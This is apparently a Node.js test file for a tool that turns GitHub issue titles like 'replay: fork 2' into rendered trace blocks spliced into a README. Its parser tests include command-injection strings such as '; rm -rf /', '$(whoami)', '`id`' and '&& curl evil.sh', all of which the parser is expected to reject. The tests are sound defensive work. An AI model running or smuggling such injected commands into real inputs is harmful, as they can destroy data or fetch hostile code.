#!/usr/bin/env node
// node replay/test.mjs
import assert from "node:assert";
import { readFileSync } from "node:fs";
import { parseTitle, parseArg, render, splice } from "./replay.mjs";

const trace = JSON.parse(
  readFileSync(new URL("trace.json", import.meta.url), "utf8"),
);

// Anyone on GitHub can open an issue, so the title parser is the trust boundary.
for (const [title, want] of [
  ["replay: fork 2", 2],
  ["replay: fork 0", 0],
  ["  replay: fork 3  ", 3],
  ["replay: fork 2; rm -rf /", null],
  ["replay: fork $(whoami)", null],
  ["replay: fork `id`", null],
  ["replay: fork 2 && curl evil.sh", null],
  ["replay: fork -1", null],
  ["replay: fork 2\nreplay: fork 3", null],
  ["REPLAY: FORK 2", null],
  ["replay: fork", null],
  ["x replay: fork 2", null],
  [undefined, null],
]) {
  assert.strictEqual(parseTitle(title), want, `parseTitle(${JSON.stringify(title)})`);
}

assert.strictEqual(parseArg("2"), 2);
assert.strictEqual(parseArg("2; ls"), null);
assert.strictEqual(parseArg("-1"), null);
assert.strictEqual(parseArg(undefined), null);

// An out-of-range step parses but must not render.
assert.strictEqual(render(trace, 99), null, "unrecorded fork must not render");

for (const { at } of trace.alternates) {
  const block = render(trace, at);
  assert.ok(block, `fork ${at} renders`);
  assert.ok(block.includes(`forked at step ${at}`), `fork ${at} labels itself`);

  // Steps before the fork are shared, so they appear once, not twice.
  for (let i = 0; i < at; i++) {
    const detail = trace.steps[i].detail;
    const hits = block.split(detail).length - 1;
    assert.strictEqual(hits, 1, `shared step ${i} printed once at fork ${at}`);
  }

  // Must stay narrow enough not to side-scroll on GitHub mobile.
  const widest = Math.max(
    ...block
      .split("```text")[1]
      .split("```")[0]
      .split("\n")
      .map((l) => [...l].length),
  );
  assert.ok(widest <= 72, `fork ${at} is ${widest} chars wide, max 72`);
}

// Splicing is idempotent and leaves the surrounding README untouched.
const readme = readFileSync(new URL("../README.md", import.meta.url), "utf8");
const once = splice(readme, render(trace, 2));
assert.strictEqual(splice(once, render(trace, 2)), once, "splice is idempotent");
assert.ok(once.includes("## Operating range"), "splice preserves the rest");
assert.strictEqual(splice("no markers here", render(trace, 2)), null);

console.log("all replay tests pass");
